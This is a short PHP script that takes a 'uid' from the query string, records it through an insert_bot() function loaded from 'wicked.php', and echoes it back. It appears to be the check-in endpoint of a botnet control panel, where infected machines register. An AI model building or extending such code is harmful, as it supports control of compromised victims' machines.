<?php
require 'includes/php/wicked.php';

@$uid = htmlspecialchars($_GET['uid']);

if ($uid != '')
{
    try
    {
        insert_bot($uid);
    }
    catch (PDOException $ex)
    {
        echo 'Failed to insert bot into database!';
    }
}

echo $uid;

?>